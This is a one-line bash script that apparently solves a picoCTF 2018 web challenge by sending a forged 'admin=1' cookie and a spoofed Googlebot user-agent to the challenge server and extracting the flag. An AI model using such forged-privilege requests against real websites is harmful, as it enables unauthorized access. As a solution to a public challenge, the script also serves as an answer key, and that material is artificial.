#!/bin/bash

curl --cookie 'admin=1' -A 'Googlebot' -s http://2018shell.picoctf.com:11421/flag | grep -oE 'picoCTF{.*}'
